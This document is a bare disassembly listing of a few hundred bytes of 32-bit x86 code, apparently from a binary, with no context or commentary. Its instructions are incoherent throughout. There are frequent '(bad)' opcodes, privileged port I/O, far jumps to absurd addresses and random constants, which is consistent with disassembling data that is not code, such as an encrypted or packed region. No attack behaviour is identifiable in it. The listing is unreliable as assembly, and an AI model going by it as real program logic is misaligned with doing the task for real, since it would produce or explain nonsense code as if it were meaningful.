  40fb00:	add    BYTE PTR [edx+0x298569d8],al
  40fb06:	mov    eax,?
  40fb08:	(bad)  
  40fb09:	daa    
  40fb0a:	rcl    BYTE PTR [ebx],cl
  40fb0c:	cmc    
  40fb0d:	and    eax,0x248f6e9d
  40fb12:	adc    eax,0xe610b92d
  40fb17:	nop
  40fb18:	ret    0xc1e6
  40fb1b:	xor    eax,0x6d34e0af
  40fb20:	popa   
  40fb21:	push   ecx
  40fb22:	mov    dh,0x14
  40fb24:	xor    cl,BYTE PTR [esi]
  40fb26:	or     BYTE PTR [eax],cl
  40fb28:	sbb    eax,0x8f8b5d9d
  40fb2d:	stos   DWORD PTR es:[edi],eax
  40fb2e:	(bad)  
  40fb31:	into   
  40fb32:	cmp    DWORD PTR [edi-0x27],eax
  40fb35:	pushf  
  40fb36:	push   ss
  40fb37:	mov    cl,0x75
  40fb39:	jecxz  0x40fb05
  40fb3b:	in     al,0x3
  40fb3d:	mov    bl,0x4c
  40fb3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb40:	mov    BYTE PTR [eax+0x63222d9c],dh
  40fb46:	jl     0x40fba8
  40fb48:	ds inc edi
  40fb4a:	pop    edi
  40fb4b:	sbb    edx,DWORD PTR [ebx-0x31]
  40fb4e:	lahf   
  40fb4f:	int3   
  40fb50:	cmp    ebx,ecx
  40fb52:	xor    DWORD PTR [edi],eax
  40fb54:	or     DWORD PTR [edi+0x1e],0x58f9bfb0
  40fb5b:	and    DWORD PTR [ebp+0x57],edi
  40fb5e:	push   0xd5c0c7a3
  40fb63:	inc    esi
  40fb64:	dec    edi
  40fb65:	les    edx,FWORD PTR [edx-0x7a]
  40fb68:	push   ds
  40fb69:	or     eax,0x215a6e54
  40fb6e:	sbb    eax,0xf13b2201
  40fb73:	inc    DWORD PTR [esi+edx*8+0x3f]
  40fb77:	xchg   esi,eax
  40fb78:	mov    dh,0x92
  40fb7a:	scas   al,BYTE PTR es:[edi]
  40fb7b:	sti    
  40fb7c:	leave  
  40fb7d:	push   0xffffff9f
  40fb7f:	jmp    FWORD PTR [edi-0x399feb3]
  40fb85:	stos   BYTE PTR es:[edi],al
  40fb86:	dec    eax
  40fb87:	push   ebx
  40fb88:	ficom  DWORD PTR [eax]
  40fb8a:	(bad)  
  40fb8c:	pop    es
  40fb8d:	bound  esi,QWORD PTR [edi]
  40fb8f:	mov    eax,0x49718952
  40fb94:	adc    eax,0x3d00db06
  40fb99:	out    0x0,eax
  40fb9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb9c:	xor    al,0x2d
  40fb9e:	stos   DWORD PTR es:[edi],eax
  40fb9f:	outs   dx,BYTE PTR ds:[esi]
  40fba0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fba1:	dec    eax
  40fba2:	sbb    BYTE PTR [eax],bl
  40fba4:	adc    BYTE PTR [edx+0x3b],0xd2
  40fba8:	add    ecx,DWORD PTR [eax+esi*4]
  40fbab:	sbb    al,0x57
  40fbad:	ss cwde 
  40fbaf:	cs push ss
  40fbb1:	cld    
  40fbb2:	dec    ebp
  40fbb3:	clc    
  40fbb4:	call   0xcba6b433
  40fbb9:	push   edi
  40fbba:	fld    DWORD PTR ds:0x400d0104
  40fbc0:	jp     0x40fbda
  40fbc2:	pushf  
  40fbc3:	sub    edi,DWORD PTR [ecx]
  40fbc5:	adc    ch,ah
  40fbc7:	mov    eax,ds:0x85891ed3
  40fbcc:	aas    
  40fbcd:	add    BYTE PTR [esi+ecx*1],cl
  40fbd0:	mov    ebx,0x85430a67
  40fbd5:	std    
  40fbd6:	cs (bad) 
  40fbd8:	lods   al,BYTE PTR ds:[esi]
  40fbd9:	nop
  40fbda:	mov    ch,0xfe
  40fbdc:	mov    bl,0xc6
  40fbde:	push   edx
  40fbdf:	push   esi
  40fbe0:	inc    ebp
  40fbe1:	retf   0xea0b
  40fbe4:	inc    edi
  40fbe5:	int3   
  40fbe6:	fdivrp st(2),st
  40fbe8:	stos   DWORD PTR es:[edi],eax
  40fbe9:	(bad)  
  40fbea:	jns    0x40fb9d
  40fbec:	vpmadcswd ymm15,ymm5,ymm4,YMMWORD PTR [edx-0x1e0100e1]
  40fbf6:	jmp    0x40fc04
  40fbf8:	loope  0x40fc08
  40fbfa:	scas   al,BYTE PTR es:[edi]
  40fbfb:	mov    edx,0xc7c02065
  40fc00:	fnsave [eax]
  40fc02:	add    al,0x3a
  40fc04:	xchg   ecx,eax
  40fc05:	in     al,0x5
  40fc07:	or     esi,ecx
  40fc09:	pusha  
  40fc0a:	fsubr  QWORD PTR ds:0xec80c156
  40fc10:	mov    al,0xa7
  40fc12:	sbb    eax,0x5f2be5d
  40fc17:	sbb    ebp,DWORD PTR [eax-0x4c]
  40fc1a:	(bad)  
  40fc1b:	mov    esp,DWORD PTR [ecx+0x62fa95f4]
  40fc21:	push   es
  40fc22:	xchg   edx,eax
  40fc23:	inc    edi
  40fc24:	out    0x60,al
  40fc26:	loope  0x40fc07
  40fc28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc29:	adc    DWORD PTR ds:0x1bb7d82,edi
  40fc2f:	xor    BYTE PTR [edx+0x695b299f],dl
  40fc35:	(bad)  
  40fc37:	sbb    edi,DWORD PTR [ecx-0xf]
  40fc3a:	popf   
  40fc3b:	jbe    0x40fc9a
  40fc3d:	mov    DWORD PTR ds:0xcf1f50be,ebp
  40fc43:	inc    eax
  40fc44:	cwde   
  40fc45:	addr16 (bad) 
  40fc47:	adc    cl,BYTE PTR [edi+0xa]
  40fc4a:	or     BYTE PTR [eax+ebp*2+0x69803b],ah
  40fc51:	js     0x40fbee
  40fc53:	fistp  WORD PTR [ebx+edi*4+0x4d599]
  40fc5a:	imul   BYTE PTR [edx+eax*2-0x80]
  40fc5e:	fidiv  WORD PTR [eax+ecx*8]
  40fc61:	cli    
  40fc62:	sbb    ebx,DWORD PTR [esi]
  40fc64:	jbe    0x40fc01
  40fc66:	add    DWORD PTR cs:[ecx-0x53],edx
  40fc6a:	jmp    0x9e43f93a
  40fc6f:	fbld   TBYTE PTR [ebp+0x2180926d]
  40fc75:	pop    ecx
  40fc76:	xchg   esp,eax
  40fc77:	data16 mov al,0x51
  40fc7a:	xor    al,0xae
  40fc7c:	adc    edi,DWORD PTR [esi-0x20fedc7a]
  40fc82:	jno    0x40fc8f
  40fc84:	pop    esi
  40fc85:	inc    esp
  40fc86:	iret   
  40fc87:	xor    esp,DWORD PTR [edx+eiz*4]
  40fc8a:	clc    
  40fc8b:	(bad)  
  40fc8c:	dec    ebp
  40fc8d:	ror    BYTE PTR ds:0x3d8b642b,1
  40fc93:	out    0xb3,eax
  40fc95:	inc    ebx
  40fc96:	(bad)  
  40fc97:	xchg   ebp,eax
  40fc98:	jg     0x40fc67
  40fc9a:	scas   eax,DWORD PTR es:[edi]
  40fc9b:	push   esp
  40fc9c:	pop    esi
  40fc9d:	xchg   edi,eax
  40fc9e:	arpl   cx,cx
  40fca0:	or     eax,0x680637f8
  40fca5:	enter  0x86b5,0xd6
  40fca9:	cmc    
  40fcaa:	add    eax,0xf8f6e350
  40fcaf:	mov    ds:0x9b4d1196,eax
  40fcb4:	jae    0x40fc4b
  40fcb6:	ror    ah,0x2
  40fcb9:	or     al,0x69
  40fcbb:	ret    0x98eb
  40fcbe:	inc    esi
  40fcbf:	pop    ebx
  40fcc0:	lds    edi,FWORD PTR [esi+0x262eb533]
  40fcc6:	jle    0x40fced
  40fcc8:	pop    ecx
  40fcc9:	int3   
  40fcca:	or     cl,BYTE PTR [eax-0x394ecd70]
  40fcd0:	jp     0x40fcbf
  40fcd2:	cld    
  40fcd3:	pushf  
  40fcd4:	xor    al,0xe
  40fcd6:	jmp    0xf921:0x10296a0
  40fcdd:	sbb    edx,0xffffffb5
  40fce0:	int    0x5
  40fce2:	in     al,dx
  40fce3:	inc    ebp
  40fce4:	lods   al,BYTE PTR ds:[esi]
  40fce5:	xchg   BYTE PTR [ebp+0x1d7ab3dd],cl
  40fceb:	sbb    eax,0xccad0310
  40fcf0:	pop    es
  40fcf1:	pop    ds
  40fcf2:	stos   DWORD PTR es:[edi],eax
  40fcf3:	push   edi
  40fcf4:	popf   
  40fcf5:	std    
  40fcf6:	xchg   esi,eax
  40fcf7:	adc    DWORD PTR es:[ecx],ebp
  40fcfa:	dec    edi
  40fcfb:	xlat   BYTE PTR ds:[ebx]
  40fcfc:	into   
  40fcfd:	sbb    al,0x8
  40fcff:	sub    DWORD PTR [ebx-0xb88cfd],esi
  40fd05:	aaa    
  40fd06:	out    dx,eax
  40fd07:	popa   
  40fd08:	rol    BYTE PTR [esi],cl
  40fd0a:	cmp    eax,0x8a9ac672
  40fd0f:	and    al,0x36
  40fd11:	fwait
  40fd12:	mov    ah,0x5d
  40fd14:	test   bh,al
  40fd16:	fnsave [ecx]
  40fd18:	cmp    ebx,edx
  40fd1a:	inc    ebp
  40fd1b:	mov    ecx,0xc41be70e
  40fd20:	sbb    dh,ch
  40fd22:	jb     0x40fd0f
  40fd24:	ss jne 0x40fce0
  40fd27:	retf   0x2ea8
  40fd2a:	jmp    0x40fda4
  40fd2c:	jmp    0x2ad9:0x7077190c
  40fd33:	aas    
  40fd34:	andps  xmm6,XMMWORD PTR [ebx]
  40fd37:	ret    0x304d
  40fd3a:	fimul  WORD PTR [edx-0x59]
  40fd3d:	int    0xf7
  40fd3f:	out    0x21,eax
  40fd41:	and    al,0xc1
  40fd43:	stos   DWORD PTR es:[edi],eax
  40fd44:	jno    0x40fd5c
  40fd46:	loope  0x40fd49
  40fd48:	ret    
  40fd49:	mov    cl,BYTE PTR [ebp-0x52]
  40fd4c:	aad    0x5
  40fd4e:	jmp    0x140bef3f
  40fd53:	pop    esp
  40fd54:	sbb    ebx,esi
  40fd56:	cmp    BYTE PTR [eax+0x2b6c3c1d],al
  40fd5c:	jae    0x40fdd4
  40fd5e:	pop    ebx
  40fd5f:	xor    BYTE PTR [edi+0x53b100a1],bl
  40fd65:	scas   al,BYTE PTR es:[edi]
  40fd66:	xor    bh,BYTE PTR [eax+0x400c5ff8]
  40fd6c:	gs rcl dl,1
  40fd6f:	cmp    al,0x58
  40fd71:	mov    eax,0xf7e7c68f
  40fd76:	leave  
  40fd77:	leave  
  40fd78:	mov    ah,0xf2
  40fd7a:	mov    cl,0xd
  40fd7c:	pop    esp
  40fd7d:	ins    DWORD PTR es:[edi],dx
  40fd7e:	adc    DWORD PTR [edi-0x5b8c3263],ecx
  40fd84:	and    eax,0x9edb4fbe
  40fd89:	lods   al,BYTE PTR ds:[esi]
  40fd8a:	mov    esp,0x707a7740
  40fd8f:	test   BYTE PTR [ebx-0x19352e36],0xb
  40fd96:	ins    DWORD PTR es:[edi],dx
  40fd97:	xchg   BYTE PTR [edi+0x3bc8ab84],bh
  40fd9d:	int    0xaf
  40fd9f:	popf   
  40fda0:	cmp    al,0xe2
  40fda2:	scas   al,BYTE PTR es:[edi]
  40fda3:	imul   BYTE PTR [edx-0xd]
  40fda6:	pushf  
  40fda7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fda8:	sbb    BYTE PTR es:[ebx],cl
  40fdab:	shr    DWORD PTR [eax-0x5fe31d15],cl
  40fdb1:	repnz sub ah,BYTE PTR [esi]
  40fdb4:	aam    0xab
  40fdb6:	test   DWORD PTR [ecx],ebx
  40fdb8:	pop    ss
  40fdb9:	adc    dl,BYTE PTR [edx+0x26311335]
  40fdbf:	add    edi,DWORD PTR [edx+0x1bf10312]
  40fdc5:	fisttp WORD PTR [eax-0x80]
  40fdc8:	lods   eax,DWORD PTR ds:[esi]
  40fdc9:	push   ebx
  40fdca:	lock mov esi,0x955fce32
  40fdd0:	imul   esp
  40fdd2:	(bad)  
  40fdd3:	adc    al,0xae
  40fdd5:	retf   0x6721
  40fdd8:	daa    
  40fdd9:	pop    esp
  40fdda:	or     ch,ah
  40fddc:	js     0x40fded
  40fdde:	outs   dx,BYTE PTR ds:[esi]
  40fddf:	scas   eax,DWORD PTR es:[edi]
  40fde0:	sub    eax,0x45af9b54
  40fde5:	mov    bh,0x72
  40fde7:	hlt    
  40fde8:	push   edi
  40fde9:	js     0x40fdfe
  40fdeb:	je     0x40fd7c
  40fded:	shr    DWORD PTR [ebx],1
  40fdef:	inc    ebp
  40fdf0:	jnp    0x40fe3d
  40fdf2:	cli    
  40fdf3:	lss    edx,FWORD PTR [esi+edi*8+0x4d28bbe4]
  40fdfb:	mov    eax,0xb609ba91
  40fe00:	out    0xaa,eax
  40fe02:	cmp    eax,0xc2157b92
  40fe07:	inc    esp
  40fe08:	jmp    0xcd9b:0xa81b5afa
  40fe0f:	jno    0x40fd93
  40fe11:	xlat   BYTE PTR ds:[ebx]
  40fe12:	xor    BYTE PTR [edi+edx*2-0x61],dh
  40fe16:	pop    edx
  40fe17:	mov    edi,0x50d73d9d
  40fe1d:	out    dx,al
  40fe1e:	sar    edx,1
  40fe20:	push   0x1d9f5039
  40fe25:	xor    ecx,DWORD PTR [esi+eax*4-0x34]
  40fe29:	lods   al,BYTE PTR ds:[esi]
  40fe2a:	inc    esp
  40fe2b:	jl     0x40fdc9
  40fe2d:	xchg   ecx,eax
  40fe2e:	loopne 0x40fead
  40fe30:	ins    BYTE PTR es:[edi],dx
  40fe31:	xchg   edx,eax
  40fe32:	push   ss
  40fe33:	mov    al,0x42
  40fe35:	loopne 0x40fe71
  40fe37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe38:	jbe    0x40fddb
  40fe3a:	aam    0x78
  40fe3c:	mov    al,0xcc
  40fe3e:	sbb    eax,0xfdb47e0b
  40fe43:	push   ebx
  40fe44:	dec    esi
  40fe45:	or     al,0xe5
  40fe47:	mov    eax,0x22d075fc
  40fe4c:	jne    0x40fec4
  40fe4e:	jmp    0xdb2b9273
  40fe53:	cmp    al,0xe8
  40fe55:	(bad)  
  40fe57:	(bad)  
  40fe58:	jmp    0xd3b0:0xb1158a94
  40fe5f:	push   ebx
  40fe61:	enter  0x831b,0x9e
  40fe65:	jns    0x40fde9
  40fe67:	das    
  40fe68:	int    0x36
  40fe6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe6b:	stc    
  40fe6c:	lea    esi,[eax+0x46b319d0]
  40fe72:	xchg   ebp,eax
  40fe73:	mov    ecx,DWORD PTR [edx+0x490bb3e7]
  40fe79:	fs xchg ecx,eax
  40fe7b:	adc    ecx,0xffffff84
  40fe7e:	xor    ah,BYTE PTR [eax]
  40fe80:	iret   
  40fe81:	dec    esp
  40fe82:	rcr    ebp,cl
  40fe84:	mov    dh,0x1d
  40fe86:	aaa    
  40fe87:	iret   
  40fe88:	(bad)  
  40fe89:	xchg   edi,eax
  40fe8a:	xor    al,0xfc
  40fe8c:	(bad)  
  40fe8d:	pushf  
  40fe8e:	(bad)  
  40fe8f:	cs inc eax
  40fe91:	scas   eax,DWORD PTR es:[edi]
  40fe92:	mov    ch,0x27
  40fe94:	xchg   BYTE PTR [edx-0x5b],ch
  40fe97:	pop    eax
  40fe98:	scas   al,BYTE PTR es:[edi]
  40fe99:	dec    ebp
  40fe9a:	inc    edi
  40fe9b:	fcom   DWORD PTR [ebx+ecx*1-0x336e9e4d]
  40fea2:	js     0x40fe2a
  40fea4:	jmp    0x40fe8b
  40fea6:	push   ecx
  40fea7:	pop    ds
  40fea8:	cmp    BYTE PTR [edi+0x3b3237bc],bh
  40feae:	sti    
  40feaf:	repz into 
  40feb1:	dec    esp
  40feb2:	add    DWORD PTR [ecx-0x48a7bed4],0xa26a4671
  40febc:	jmp    0xe8d0:0x493e9389
  40fec3:	and    edx,DWORD PTR [esi+0x4d72079e]
  40fec9:	fimul  DWORD PTR [eax-0x3f]
  40fecc:	ins    DWORD PTR es:[edi],dx
  40fecd:	add    al,0xca
  40fecf:	adc    al,0xd4
  40fed1:	inc    edi
  40fed2:	int    0x88
  40fed4:	inc    edi
  40fed5:	add    BYTE PTR [ecx-0x86556c8],al
  40fedb:	and    dl,BYTE PTR [ebx+0x49]
  40fede:	inc    edi
  40fedf:	stos   BYTE PTR es:[edi],al
  40fee0:	rcl    ecx,0x7a
  40fee3:	int3   
  40fee4:	(bad)  
  40fee5:	or     ecx,eax
  40fee7:	adc    ch,cl
  40fee9:	inc    cx
  40feeb:	ret    
  40feec:	retf   0x509d
  40feef:	jbe    0x40ff62
  40fef1:	data16 aam 0xbe
  40fef4:	pop    ebp
  40fef5:	cmp    eax,DWORD PTR [eax-0x13a2ce77]
  40fefb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fefc:	mov    al,ds:0x98fcecbe
  40ff01:	aad    0xad
  40ff03:	xchg   ecx,eax
  40ff04:	outs   dx,BYTE PTR ds:[esi]
  40ff05:	or     BYTE PTR [edi+ebp*2],al
  40ff08:	or     BYTE PTR [ebp+ebp*8-0x4328d7f9],dl
  40ff0f:	clc    
  40ff10:	test   BYTE PTR [eax+0x231895c6],dh
  40ff16:	adc    al,0xbd
  40ff18:	push   cs
  40ff19:	gs das 
  40ff1b:	mov    WORD PTR [esi-0x71577373],es
  40ff21:	cmp    eax,0xa6b0b9a9
  40ff26:	inc    edx
  40ff27:	pusha  
  40ff28:	add    bl,BYTE PTR ss:[ebp+0x5671c48c]
  40ff2f:	jmp    0x40febc
  40ff31:	and    dl,BYTE PTR [esi]
  40ff33:	xchg   ebx,eax
  40ff34:	mov    ecx,0x84279e76
  40ff39:	inc    eax
  40ff3a:	arpl   WORD PTR [esi-0x32],di
  40ff3d:	jo     0x40fee0
  40ff3f:	loope  0x40ffb3
  40ff41:	mov    gs:0x56023215,eax
  40ff47:	mov    esp,0xd3b8e88c
  40ff4c:	mov    ecx,edi
  40ff4e:	push   ebx
  40ff4f:	outs   dx,BYTE PTR ds:[esi]
  40ff50:	pop    ecx
  40ff51:	call   0x5407010
  40ff56:	int3   
  40ff57:	xchg   ebx,eax
  40ff58:	arpl   WORD PTR [esi-0x49],di
  40ff5b:	xor    edi,esi
  40ff5d:	adc    al,BYTE PTR [ecx+0x14]
  40ff60:	out    0xc2,eax
  40ff62:	pop    ss
  40ff63:	and    al,0xc8
  40ff65:	stos   DWORD PTR es:[edi],eax
  40ff66:	mov    ch,0x25
  40ff68:	and    BYTE PTR [eax],al
  40ff6a:	bound  ecx,QWORD PTR ds:0x15d0162f
  40ff70:	in     al,dx
  40ff71:	xchg   BYTE PTR [edx+0x6cd254a7],al
  40ff77:	push   eax
  40ff78:	test   edi,esp
  40ff7a:	call   0x4da4:0x3485361d
  40ff81:	popa   
  40ff82:	add    edi,DWORD PTR [edx-0x6223ff99]
  40ff88:	fsub   QWORD PTR [eax-0x21cd4d3f]
  40ff8e:	aaa    
  40ff8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff90:	push   ebp
  40ff91:	mov    al,ds:0xb16db1ef
  40ff96:	out    0x5,eax
  40ff98:	xchg   ebx,esp
  40ff9a:	mov    ah,0xa3
  40ff9c:	cmp    al,BYTE PTR [edi+0x7efbcd58]
  40ffa2:	mov    WORD PTR [esp+ebx*2-0x2d],ds
  40ffa6:	pop    eax
  40ffa7:	sub    ebp,DWORD PTR [eax+0x309b5093]
  40ffad:	jmp    0x9582:0xd5972961
  40ffb4:	mov    cl,BYTE PTR [bp+di+0xa]
  40ffb8:	xchg   edi,eax
  40ffb9:	jl     0x40ff7d
  40ffbb:	fucomi st,st(2)
  40ffbd:	popa   
  40ffbe:	xchg   esi,eax
  40ffbf:	nop
  40ffc0:	inc    edi
  40ffc1:	push   esi
  40ffc2:	push   es
  40ffc3:	mov    WORD PTR [edx+0x633ab860],gs
  40ffc9:	or     al,BYTE PTR [ecx-0x4]
  40ffcc:	jb     0x41002d
  40ffce:	lock pop edx
  40ffd0:	retf   0x647e
  40ffd3:	mov    WORD PTR [eax+0x19],ds
  40ffd6:	mov    eax,ds:0x960ef4a3
  40ffdb:	bound  eax,QWORD PTR [esp+ebp*2-0x57]
  40ffdf:	ins    BYTE PTR es:[edi],dx
  40ffe0:	pusha  
  40ffe1:	clc    
  40ffe2:	mov    ebx,DWORD PTR ds:0xb6c07088
  40ffe8:	xlat   BYTE PTR ds:[ebx]
  40ffe9:	push   ecx
  40ffea:	rol    DWORD PTR [eax+edi*8+0x39],0xa6
  40ffef:	cdq    
  40fff0:	lea    edi,[ebx]
  40fff2:	jmp    0x3eef:0xe4fdfc7e
  40fff9:	dec    edx
  40fffa:	test   eax,0x8b61e9b0
  40ffff:	xchg   BYTE PTR [ebp+0x1897c9ee],cl
  410005:	(bad)  
  410007:	es ss mov bh,0xd
  41000b:	in     eax,dx
  41000c:	enter  0xc2f4,0x55
  410010:	pop    ebp
  410011:	pushf  
  410012:	adc    bh,dh
  410014:	push   ds
  410015:	in     eax,0x38
  410017:	sbb    edx,ecx
  410019:	fbld   TBYTE PTR [ebx-0x67]
  41001c:	aad    0x90
  41001e:	popf   
  41001f:	je     0x41004b
  410021:	and    esi,DWORD PTR [edi]
  410023:	or     DWORD PTR [edx+0x6b36108e],0x68d63efd
  41002d:	out    dx,eax
  41002e:	mov    esi,0x7bbfbe34
  410033:	xor    al,0x74
  410035:	sub    DWORD PTR [edx+0x7b5eff4a],esi
  41003b:	xchg   ecx,eax
  41003c:	dec    edx
  41003d:	mov    ebx,0x9c9e87b5
  410042:	lods   eax,DWORD PTR ds:[esi]
  410043:	or     al,0x33
  410045:	loope  0x410006
  410047:	or     eax,0xff52a26c
  41004c:	xchg   ecx,eax
  41004d:	add    ebx,edi
  41004f:	in     eax,0x36
  410051:	inc    esi
  410052:	fld    DWORD PTR [ebp+esi*2-0x2cd757e4]
  410059:	dec    edx
  41005a:	xchg   edx,eax
  41005b:	pop    ecx
  41005c:	mov    esp,0x91f144a7
  410061:	jl     0x410099
  410063:	lods   al,BYTE PTR ds:[esi]
  410064:	mov    eax,0xc2c9b9aa
  410069:	xchg   ebx,eax
  41006a:	jne    0x410047
  41006c:	hlt    
  41006d:	mov    dl,0x32
  41006f:	nop
  410070:	les    edx,FWORD PTR [edx+0x35]
  410073:	dec    ecx
  410074:	icebp  
  410075:	pop    edi
  410076:	cwde   
  410077:	cmc    
  410078:	in     eax,dx
  410079:	jbe    0x4100bc
  41007b:	lock ret 0xcbf3
  41007f:	and    DWORD PTR [esi-0x72],esi
  410082:	nop
  410083:	push   esp
  410084:	xor    BYTE PTR [edi+edx*4-0x4c25a62e],dh
  41008b:	xchg   edi,eax
  41008c:	ins    DWORD PTR es:[edi],dx
  41008d:	and    al,0x6b
  41008f:	xchg   DWORD PTR [eax+0x8],edx
  410092:	das    
  410093:	in     al,0xc8
  410095:	popa   
  410096:	mov    cl,0x3
  410098:	mov    ds:0x56f23cb,eax
  41009d:	mov    al,ds:0xde2b25e3
  4100a2:	outs   dx,BYTE PTR ds:[esi]
  4100a3:	retf   0x1f4d
  4100a6:	(bad)  [edi]
  4100a8:	xchg   edi,eax
  4100a9:	sub    al,0x9c
  4100ab:	adc    al,0x98
  4100ad:	sbb    cl,ah
  4100af:	jge    0x41005b
  4100b1:	mov    ah,0xdd
  4100b3:	rcl    BYTE PTR [esi+0x34],1
  4100b6:	hlt    
  4100b7:	iret   
  4100b8:	mov    dl,0x1e
  4100ba:	ja     0x41004e
  4100bc:	pop    eax
  4100bd:	leave  
  4100be:	fisub  WORD PTR [esi-0x3dc53b15]
  4100c4:	adc    DWORD PTR [eax],ebx
  4100c6:	mov    ds:0x3b907ed0,al
  4100cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100cc:	push   ecx
  4100cd:	mov    DWORD PTR [esi-0x7b],esp
  4100d0:	inc    ecx
  4100d1:	jbe    0x410076
  4100d3:	rol    bl,cl
  4100d5:	mov    fs,WORD PTR [edx-0x22]
  4100d8:	and    edx,DWORD PTR [edx-0x68]
  4100db:	(bad)
  4100df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100e0:	push   ebp
  4100e1:	enter  0x3c26,0x45
  4100e5:	or     DWORD PTR ds:0x27469185,ebp
  4100eb:	call   0x5d8c80a3
  4100f0:	test   bh,ah
  4100f2:	and    BYTE PTR [edx-0x270e58f6],0x1c
  4100f9:	dec    esi
  4100fa:	cmc    
  4100fb:	xchg   DWORD PTR [ebp-0x14],esp
  4100fe:	data16 jl 0x410163
  410101:	cdq    
  410102:	std    
  410103:	cmp    cl,BYTE PTR [ecx-0x31ae4ec5]
  410109:	jne    0x410132
  41010b:	xchg   esp,eax
  41010c:	dec    esi
  41010d:	and    BYTE PTR [ecx-0x37],dl
  410110:	dec    eax
  410111:	sbb    DWORD PTR [ecx+0x72],0x2b
  410115:	fsubr  st(6),st
  410117:	std    
  410118:	add    cl,BYTE PTR [ebx]
  41011a:	and    DWORD PTR [ebx+0x4e],edx
  41011d:	aaa    
  41011e:	and    ebx,edi
  410120:	cwde   
  410121:	rcr    esi,1
  410123:	jecxz  0x4100c2
  410125:	in     eax,dx
  410126:	out    dx,eax
  410127:	push   0x3e45dbc
  41012c:	inc    edi
  41012d:	into   
  41012e:	mov    eax,esp
  410130:	add    DWORD PTR [ebx+0xb],edx
  410133:	(bad)  
  410134:	cmc    
  410135:	sahf   
  410136:	ss fmul st,st(7)
  410139:	mov    ah,0xb8
  41013b:	in     eax,dx
  41013c:	push   ss
  41013d:	xchg   DWORD PTR [ecx+0x16119972],ecx
  410143:	mov    cl,0x80
  410145:	fst    DWORD PTR [eax]
  410147:	jbe    0x4101ba
  410149:	sbb    ah,cl
  41014b:	pop    ebp
  41014c:	or     dh,BYTE PTR [ecx+eiz*8]
  41014f:	sti    
  410150:	mov    ebp,0x47d13a46
  410155:	sub    DWORD PTR ds:0x2ae7b9b,esp
  41015b:	push   esp
  41015c:	aam    0x1b
  41015e:	fwait
  41015f:	test   DWORD PTR [eax-0xabcd8cd],esp
  410165:	aaa    
  410166:	cli    
  410167:	adc    edx,DWORD PTR [esp+eax*4]
  41016a:	hlt    
  41016b:	cli    
  41016c:	xchg   ebp,eax
  41016d:	pop    esp
  41016e:	(bad)
  410171:	retf   0xf49
  410174:	(bad)  
  410175:	jns    0x410199
  410177:	pop    ss
  410178:	xlat   BYTE PTR ds:[ebx]
  410179:	xchg   BYTE PTR [eax],dh
  41017b:	adc    BYTE PTR [eax],ah
  41017d:	mov    ds:0x3406a52f,al
  410182:	ret    0xf02f
  410185:	mov    al,ds:0x242dffb7
  41018a:	inc    edx
  41018b:	cmp    al,bl
  41018d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41018e:	pop    esp
  41018f:	xor    al,0x69
  410191:	push   esi
  410192:	xor    esi,DWORD PTR [ebp+0x1cc6a328]
  410198:	push   ebp
  410199:	xchg   esp,eax
  41019a:	xchg   edx,eax
  41019b:	adc    al,0x10
  41019d:	test   eax,0xd0e8368f
  4101a2:	adc    esp,DWORD PTR [ebx-0xc]
  4101a5:	int3   
  4101a6:	mul    BYTE PTR [edx]
  4101a8:	fxch   st(1)
  4101aa:	pop    esp
  4101ab:	jmp    0xbb14a749
  4101b0:	mov    ah,0x64
  4101b2:	and    dh,ah
  4101b4:	add    BYTE PTR [eax-0x3fc0a9aa],dl
  4101ba:	shr    BYTE PTR [eax-0x52cd41eb],1
  4101c0:	pop    ebx
  4101c1:	cmp    BYTE PTR [ecx+0x10],0x53
  4101c5:	xchg   ebx,eax
  4101c6:	addr16 sti 
  4101c8:	loope  0x4101c8
  4101ca:	jnp    0x410193
  4101cc:	xor    eax,0xdbaa2557
  4101d1:	(bad)  
  4101d2:	retf   0x431a
  4101d5:	cmp    ch,BYTE PTR [eax]
  4101d7:	or     edx,edi
  4101d9:	popf   
  4101da:	enter  0x6107,0xbe
  4101de:	xor    DWORD PTR [ebx-0x51],esi
  4101e1:	xchg   edi,eax
  4101e2:	loop   0x410209
  4101e4:	loope  0x410191
  4101e6:	jnp    0x4101b0
  4101e8:	mov    ds:0xe7a60e49,al
  4101ed:	pop    es
  4101ee:	addr16 pop eax
  4101f0:	loop   0x4101e0
  4101f2:	ds jo  0x4101c3
  4101f5:	jno    0x4101c7
  4101f7:	mov    bp,0x121f
  4101fb:	inc    ebp
  4101fc:	mov    WORD PTR [edi-0x4ffbc3eb],?
  410202:	retf   0x3e60
  410205:	mov    eax,esi
  410207:	mov    bl,0x76
  410209:	(bad)  [esi-0x76]
  41020c:	fsubrp st(3),st
  41020e:	jmp    0x1c33:0x5f05979d
  410215:	jnp    0x4101c0
  410217:	bound  ecx,QWORD PTR [edi-0x1]
  41021a:	ret    
  41021b:	xor    BYTE PTR [eax],dl
  41021d:	je     0x4101f5
  41021f:	xchg   ebx,eax
  410220:	out    dx,eax
  410221:	fstp   TBYTE PTR [eax]
  410223:	add    al,0x64
  410225:	shr    DWORD PTR [ebx+0x59],1
  410228:	lea    ecx,[eax+0x636fe54f]
  41022e:	adc    eax,DWORD PTR [esi]
  410230:	fs mov edi,0xb38697b9
  410236:	test   BYTE PTR [ebp-0x3e36a2cd],dh
  41023c:	outs   dx,BYTE PTR ds:[esi]
  41023d:	popa   
  41023e:	sub    BYTE PTR [edi-0x5e2868ee],al
  410244:	inc    esp
  410245:	(bad)  
  410246:	jno    0x410279
  410248:	fimul  DWORD PTR [edi]
  41024a:	test   eax,0x7082b8c2
  41024f:	xchg   ebp,eax
  410250:	clc    
  410251:	mov    al,ah
  410253:	mov    dl,0x33
  410255:	cmp    cl,0x30
  410258:	mov    ebx,0xb4f2eff1
  41025d:	stos   DWORD PTR es:[edi],eax
  41025e:	data16 data16 arpl WORD PTR [ecx],ax
  410262:	pop    ebx
  410263:	es ror eax,cl
  410266:	out    0x38,al
  410268:	retf   0xe885
